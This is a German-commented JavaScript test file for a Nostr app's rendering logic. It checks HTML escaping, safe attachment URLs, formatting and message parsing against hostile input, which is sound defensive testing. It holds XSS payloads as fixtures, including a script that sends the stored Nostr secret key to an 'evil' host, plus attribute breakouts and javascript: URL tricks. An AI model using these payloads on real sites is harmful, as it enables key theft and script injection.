/**
 * Tests fuer die Darstellungslogik der App.
 *
 * Der Schwerpunkt liegt auf feindlichen Eingaben: alles hier verarbeitet Text
 * aus fremden Relay-Events. Genau an dieser Stelle steckte schon einmal ein
 * XSS-Loch (interpoliertes onclick in den LP-Angeboten), ueber das der
 * Nostr-Secret-Key aus localStorage abfliessen konnte.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import {
  escapeHtml,
  pkShort,
  isSafeAttachmentUrl,
  renderAttachment,
  isForeignPaymentNoise,
  fmtSats,
  fmtSol,
  budgetView,
  ago,
  parseDmBody,
  parseImetaTags,
  imetaSchluessel,
} from "../src/shell-logic.js";
import { verschluesseleDatei } from "@freedomstack/protocol";

// ------------------------------------------------------------- Escaping

test("Escaping: die klassischen Ausbruchszeichen sind weg", () => {
  const boese = `<img src=x onerror="alert(1)">`;
  const sicher = escapeHtml(boese);
  for (const c of ["<", ">", '"', "'"]) {
    assert.ok(!sicher.includes(c), `${c} darf nicht durchkommen`);
  }
});

test("Escaping: Anfuehrungszeichen, damit Attribute nicht ausbrechbar sind", () => {
  // Ohne Quote-Escaping waere data-name="<hier>" der Einstieg.
  const raus = escapeHtml(`" onmouseover="alert(1)`);
  assert.ok(!raus.includes('"'));
  assert.ok(!raus.includes("'"));
});

test("Escaping: kaufmaennisches Und wird zuerst behandelt", () => {
  // Sonst wuerde "&lt;" zu "&amp;lt;" oder umgekehrt doppelt dekodierbar.
  assert.equal(escapeHtml("&"), "&#38;");
  assert.equal(escapeHtml("&lt;"), "&#38;lt;");
});

test("Escaping: harmloser Text bleibt lesbar", () => {
  assert.equal(escapeHtml("Grüße aus Wien — alles ok"), "Grüße aus Wien — alles ok");
  assert.equal(escapeHtml(""), "");
});

test("Pubkey-Kurzform: kuerzt, ohne die Enden zu verlieren", () => {
  const pk = "a".repeat(32) + "b".repeat(32);
  const kurz = pkShort(pk);
  assert.ok(kurz.startsWith("aaaaaaaa"));
  assert.ok(kurz.endsWith("bbbb"));
  assert.ok(kurz.length < 20);
  // Kurze Eingaben nicht verstuemmeln.
  assert.equal(pkShort("abc"), "abc");
});

// ------------------------------------------------------------- URL-Schemata

test("Anhang-URLs: gefaehrliche Schemata werden abgelehnt", () => {
  for (const url of [
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox",
    "blob:https://evil.io/x",
    "file:///etc/passwd",
    "",
  ]) {
    assert.equal(isSafeAttachmentUrl(url), false, `${url} muss abgelehnt werden`);
  }
});

test("Anhang-URLs: Steuerzeichen-Trick greift nicht", () => {
  // Manche Parser lesen "java\nscript:" noch als javascript:.
  assert.equal(isSafeAttachmentUrl("java\nscript:alert(1)"), false);
  assert.equal(isSafeAttachmentUrl("\u0001javascript:alert(1)"), false);
  assert.equal(isSafeAttachmentUrl("  javascript:alert(1)"), false);
});

test("Anhang-URLs: erlaubte Schemata funktionieren weiter", () => {
  for (const url of [
    "https://cdn.example.com/bild.png",
    "http://192.0.2.1/video.mp4",
    "data:image/png;base64,iVBOR",
    "data:audio/mpeg;base64,SUQz",
  ]) {
    assert.equal(isSafeAttachmentUrl(url), true, url);
  }
});

// ------------------------------------------------------------- Anhänge

test("Anhang: boesartiger Dateiname landet nicht als HTML im Dokument", () => {
  const html = renderAttachment({
    name: `<script>fetch('http://evil/?k='+localStorage['freedom.sk'])</script>`,
    mime: "image/png",
    size: 1,
    url: "https://ok.example/a.png",
  });
  assert.ok(!html.includes("<script"), "genau dieser Weg war der alte XSS-Pfad");
  assert.ok(html.includes("<img"));
});

test("Anhang: boesartige URL wird nicht als Quelle gesetzt", () => {
  const html = renderAttachment({
    name: "bild", mime: "image/png", size: 1, url: "javascript:alert(1)",
  });
  assert.ok(!html.includes("javascript:"));
  assert.match(html, /nicht unterstuetzt/);
});

test("Anhang: Anfuehrungszeichen in der URL brechen das Attribut nicht auf", () => {
  const html = renderAttachment({
    name: "x", mime: "image/png", size: 1,
    url: `https://ok.io/a.png" onerror="alert(1)`,
  });
  assert.ok(!html.includes('onerror="alert'), "Attribut darf nicht ausbrechbar sein");
});

test("Anhang: Medientypen werden passend dargestellt", () => {
  const bild = renderAttachment({ name: "a", mime: "image/png", size: 1, url: "https://x.io/a.png" });
  const video = renderAttachment({ name: "a", mime: "VIDEO/MP4", size: 1, url: "https://x.io/a.mp4" });
  const audio = renderAttachment({ name: "a", mime: "audio/ogg", size: 1, url: "https://x.io/a.ogg" });
  const datei = renderAttachment({ name: "a", mime: "application/pdf", size: 1, url: "https://x.io/a.pdf" });

  assert.match(bild, /<img/);
  assert.match(video, /<video/, "Grossschreibung im MIME-Typ darf nichts kaputtmachen");
  assert.match(audio, /<audio/);
  assert.match(datei, /<a /);
  assert.match(datei, /rel="noopener noreferrer"/, "fremde Links duerfen kein window.opener bekommen");
});

test("Anhang: Blob-Verweis wird zum Ladeknopf, ID escaped", () => {
  const html = renderAttachment({
    name: "gross.zip", mime: "application/zip", size: 1,
    url: `freedom-blob:abc" onclick="alert(1)`,
  });
  assert.match(html, /chat-blob-btn/);
  assert.ok(!html.includes('onclick="alert'));
});

test("Anhang: leerer Name bekommt eine Beschriftung", () => {
  assert.match(renderAttachment({ name: "", mime: "x/y", size: 0, url: "https://x.io/a" }), /datei/);
});

// ------------------------------------------------------------- Formate

test("Betraege: unter 1 sat wird nicht auf null gerundet", () => {
  // Sonst sieht bezahlte Arbeit gratis aus.
  assert.equal(fmtSats(6), "6 msat");
  assert.equal(fmtSats(999), "999 msat");
  assert.equal(fmtSats(0), "0 sats");
});

test("Betraege: groessere Werte lesbar", () => {
  assert.match(fmtSats(1500), /1\.5 sats/);
  assert.match(fmtSats(50_000), /50 sats/);
  assert.match(fmtSats(1_500_000), /1\.500 sats/);
  assert.equal(fmtSats(-5), "—");
  assert.equal(fmtSats(NaN), "—");
});

test("SOL: kleine Betraege bleiben in lamports statt 0,0000 SOL", () => {
  assert.match(fmtSol(5000), /lamports/);
  assert.match(fmtSol(1_000_000_000), /1\.0000 SOL/);
  assert.equal(fmtSol(-1), "—");
});

test("Zeitangabe: Stufen sind sinnvoll", () => {
  const now = 1_800_000_000;
  assert.match(ago(now - 5, now), /gerade eben/);
  assert.match(ago(now - 300, now), /vor 5 min/);
  assert.match(ago(now - 7200, now), /vor 2 h/);
  assert.match(ago(now - 3 * 86400, now), /vor 3 d/);
  // Uhren laufen auseinander — eine Zukunftsangabe darf nicht "vor -2 min" ergeben.
  assert.match(ago(now + 120, now), /gerade eben/);
});

// ------------------------------------------------------------- Budget

test("Budget: warnt frueh genug, um Abbrueche mitten in einer Antwort zu vermeiden", () => {
  assert.equal(budgetView(0, 100_000).level, "ok");
  assert.equal(budgetView(70_000, 100_000).level, "warn");
  assert.equal(budgetView(90_000, 100_000).level, "err");
});

test("Budget: aufgebraucht wird als solches benannt", () => {
  const v = budgetView(100_000, 100_000);
  assert.equal(v.ratio, 1);
  assert.match(v.text, /aufgebraucht/);
});

test("Budget: Ueberzahlung kippt den Balken nicht", () => {
  const v = budgetView(500_000, 100_000);
  assert.ok(v.ratio <= 1, "der Fortschritt darf nicht ueber 100% laufen");
});

test("Budget: ohne Session eine verstaendliche Ansage statt '—'", () => {
  assert.match(budgetView(0, 0).text, /erste Anfrage startet/);
});

// ------------------------------------------------------------- Nachrichten

test("Fremdes Zahlungsrauschen wird als solches erkannt", () => {
  // Der Job des Kunden lief sauber; ein Wallet-Problem beim Provider ist
  // nicht sein Fehler und darf ihn nicht verunsichern.
  assert.equal(isForeignPaymentNoise("NWC timed out after 30s"), true);
  assert.equal(isForeignPaymentNoise("keysend failed: no route"), true);
  assert.equal(isForeignPaymentNoise("Payment Error: insufficient"), true);
  assert.equal(isForeignPaymentNoise("Modell nicht gefunden"), false);
});

test("DM-Body: alte Klartextnachrichten bleiben lesbar", () => {
  const r = parseDmBody("hallo, wie geht es dir?");
  assert.equal(r.text, "hallo, wie geht es dir?");
  assert.equal(r.attachments.length, 0);
});

test("DM-Body: Anhaenge aus dem verschluesselten Teil werden gelesen", () => {
  const r = parseDmBody(JSON.stringify({
    text: "hier das Bild",
    attachments: [{ url: "https://x.io/a.png", mime: "image/png", name: "a", size: 1 }],
  }));
  assert.equal(r.text, "hier das Bild");
  assert.equal(r.attachments.length, 1);
});

test("DM-Body: kaputtes JSON wird als Text behandelt, nicht verschluckt", () => {
  const kaputt = '{"text": "unvollstaendig';
  assert.equal(parseDmBody(kaputt).text, kaputt);
});

test("DM-Body: Anhaenge ohne URL werden aussortiert", () => {
  const r = parseDmBody(JSON.stringify({
    text: "x", attachments: [{ url: "", mime: "image/png", name: "a", size: 1 }, null],
  }));
  assert.equal(r.attachments.length, 0);
});

test("imeta: Community-Anhaenge werden gelesen", () => {
  const atts = parseImetaTags([
    ["imeta", "url https://x.io/a.png", "m image/png", "name bild.png"],
    ["p", "abc"],
    ["imeta", "m image/png"], // ohne url -> raus
  ]);
  assert.equal(atts.length, 1);
  assert.equal(atts[0].url, "https://x.io/a.png");
  assert.equal(atts[0].name, "bild.png");
});

test("imeta: fehlerhafte Tags bringen die Anzeige nicht zum Absturz", () => {
  assert.doesNotThrow(() => parseImetaTags([["imeta"], [], ["imeta", "", ""]]));
  assert.equal(parseImetaTags([["imeta"]]).length, 0);
});

// ------------------------------------------------- Verschluesselte Anhaenge (2.4)

const ENC = verschluesseleDatei(new Uint8Array([1, 2, 3])).schluessel;

test("2.4: verschluesselter Anhang wird ein Knopf mit geprueftem Schluessel, nie eine Quelle", () => {
  const blob = renderAttachment({ name: "befund.pdf", mime: "application/pdf", size: 9, url: "freedom-blob:abc123", enc: ENC });
  assert.match(blob, /class="ghost copy-btn chat-blob-btn" data-blob="abc123"/);
  assert.ok(blob.includes(`data-key="${ENC.key}"`) && blob.includes(`data-nonce="${ENC.nonce}"`) && blob.includes(`data-ox="${ENC.ox}"`));
  assert.match(blob, /🔒 befund\.pdf/);
  const blossom = renderAttachment({ name: "bild", mime: "image/png", size: 9, url: "https://blossom.example/ab", enc: ENC });
  assert.match(blossom, /data-url="https:\/\/blossom\.example\/ab"/);
  assert.doesNotMatch(blossom, /<img/, "Chiffrat nie als Bild einbinden");
});

test("2.4: kaputter Schluessel, fremdes Schema, boesartiger Typ und Name", () => {
  const kaputt = renderAttachment({ name: "x", mime: "image/png", size: 1, url: "freedom-blob:a", enc: { ...ENC, key: `${ENC.key.slice(2)}"><script>` } });
  assert.match(kaputt, /ungültigem Schlüssel/);
  assert.doesNotMatch(kaputt, /<script/);
  assert.match(renderAttachment({ name: "x", mime: "", size: 1, url: "javascript:alert(1)", enc: ENC }), /nicht unterstuetzt/);
  assert.match(renderAttachment({ name: "x", mime: "", size: 1, url: "http://klartext.example/a", enc: ENC }), /nicht unterstuetzt/, "nur https");
  const boese = renderAttachment({ name: `"><img src=x onerror=alert(1)>`, mime: `x" onclick="alert(1)`, size: 1, url: "freedom-blob:a", enc: ENC });
  // Maskiert bleibt es Text: kein neues Tag, kein ausbrechendes Attribut
  assert.doesNotMatch(boese, /<img|" onclick="/);
  assert.match(boese, /data-mime="x&#34; onclick=&#34;alert\(1\)"/);
});

test("2.4: Schluessel im imeta-Tag hin und zurueck, ohne Schluessel wie bisher", () => {
  const tag = ["imeta", "url freedom-blob:abc", "m application/pdf", "name a.pdf", ...imetaSchluessel({ name: "a.pdf", mime: "application/pdf", size: 1, url: "freedom-blob:abc", enc: ENC })];
  const [a] = parseImetaTags([tag]);
  assert.deepEqual(a.enc, ENC);
  assert.deepEqual(imetaSchluessel({ name: "a", mime: "", size: 1, url: "https://x" }), []);
  const [b] = parseImetaTags([["imeta", "url https://x.io/a.png", "m image/png"]]);
  assert.equal(b.enc, undefined);
  // Unbekanntes Verfahren: kein Schluessel, also wie ein offener Anhang
  const [c] = parseImetaTags([["imeta", "url https://x.io/a", "encryption-algorithm chacha", `decryption-key ${ENC.key}`]]);
  assert.equal(c.enc, undefined);
});

test("2.4: DM-Body traegt den Schluessel mit", () => {
  const r = parseDmBody(JSON.stringify({ text: "", attachments: [{ url: "freedom-blob:abc", mime: "application/pdf", name: "a", size: 1, enc: ENC }] }));
  assert.deepEqual(r.attachments[0].enc, ENC);
});
